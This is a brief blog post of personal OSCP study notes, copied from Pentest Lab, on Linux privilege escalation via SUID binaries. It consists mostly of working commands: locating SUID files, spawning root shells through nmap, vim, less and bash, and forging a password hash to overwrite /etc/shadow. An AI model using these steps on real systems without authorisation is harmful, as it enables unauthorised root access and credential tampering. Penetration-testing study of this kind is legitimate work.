---
layout: post
title:  "Exploiting SUIDS for Privilege Escalation"
date:   2018-11-09 10:00:00 +1100
categories: [hacking, security, privilege-escalation,oscp]
permalink: /:title:output_ext
comments: true
---
<br>
**Original Post:** [Pentest Lab](https://pentestlab.blog/2017/09/25/suid-executables/)

<br>
\-- Another copy/paste for my own reference I used for OSCP.<br>
\-- Known Linux executables that can allow privilege escalation are:

 * nmap
 * vim
 * find
 * bash
 * more
 * less
 * nano
 * cp

<br>**-- Find the files that can be exploited to gain root access:**

    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;
    find / -perm -4000 -exec ls -l {} \;


<br>**nmap <= 5.21**

    nmap -V
    nmap --interactive
    nmap> !sh
    sh-3.2# whoami
    root

<br>**vim**

    vim.tiny

<br>**Press ESC key**

    :set shell=/bin/sh
    :shell

<br>**find**

    touch me
    find me -exec whoami \;
    root

\-- Now, to gain root access, we can get a reverse shell using NC or update the /etc/shadow file with a password using sslopen

     openssl passwd -1 -salt xyz  yourpass
     makepasswd --clearfrom=- --crypt-md5 <<< YourPass

\-- Use the above output, append that to root and update shadow file.

<br>**bash**<br>

    bash -p
    bash-3.2# id

<br>**more & less**<br>

    less /etc/passwd
    !/bin/sh

<br>**nano**<br>
\-- Use nano to edit the /etc/shadow file

<br>**cp**<br>
\-- Copy shadow file, add password to it and then copy the new one back to /etc/shadow

    cp /etc/shadow /tmp/shadow
    openssl passwd -1 -salt xyz  yourpass
    vi /tmp/shadow
    cp /tmp/shadow /etc/shadow
    su root
